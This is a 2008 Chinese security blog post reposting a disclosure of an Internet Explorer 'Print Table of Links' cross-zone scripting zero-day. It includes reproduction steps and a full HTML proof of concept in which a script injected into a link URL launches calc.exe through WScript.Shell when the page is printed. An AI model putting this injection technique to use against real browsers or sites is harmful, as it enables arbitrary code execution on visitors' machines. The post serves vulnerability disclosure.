---
title: Aviv Raff的IE 0day-MS IE“Print Table of Links”Cross-Zone Scripting Vulnerability
description: MSInternetExplorer“PrintTableofLinks”Cross-ZoneScriptingVulnerability具体细节:http://aviv.raffon.net/2008/05/14/InternetExplorerQuotPrintTableOfLinksquotCrossZoneScriptingVulnerability.aspx如果启用了“PrintTableofLinks”，在打印一个网页的时候，能够导致执行任意代码，当然VISTA上UAC可以拦截它
date: 2008-05-16 08:47:47
category: 漏洞信息
tags: ['0day', '浏览器', '漏洞信息']
post_id: 483
alias: Aviv-Raff-IE-0day-Print-Table-of-Links
ViewNums: 4664
---

[夜火](/blog/)IE[浏览器](/tags/%E6%B5%8F%E8%A7%88%E5%99%A8)的[0day](/tags/0day)漏洞。。。。。。。。。代码比较简单

**MS Internet Explorer “Print Table of Links” Cross-Zone Scripting Vulnerability**
具体细节:http://aviv.raffon.net/2008/05/14/InternetExplorerQuotPrintTableOfLinksquotCrossZoneScriptingVulnerability.aspx

如果启用了 “Print Table of Links”，在打印一个网页的时候，能够导致执行任意代码，当然VISTA上UAC可以拦截它

重现：
1.下面这个地方打上勾
![](http://pic.yupoo.com/sunlei/8644058e7ef9/8tnedwcr.jpg)

2.把下面代码保存成HTML，用IE打开，打印之，calc.exe会弹出。 （也可以直接访问<http://raffon.net/research/ms/ie/print/linksrce.html>）
*<html>
<body>
Print me with table of links to execute calc.exe
<a href=”http://www.bla.com?x=b<script defer >var x=new ActiveXObject(’WScript.Shell’);x.Run(’calc.exe’);</script>a.c<u>o</u>m”></a>
<script>window.print();</script>
</body>
</html>*

这个[漏洞](/tags/%E6%B5%8F%E8%A7%88%E5%99%A8)大牛蛙他们据说当时很快就找出来了，应该也有很多别的同学找到了吧。

From：Sowhat的blog

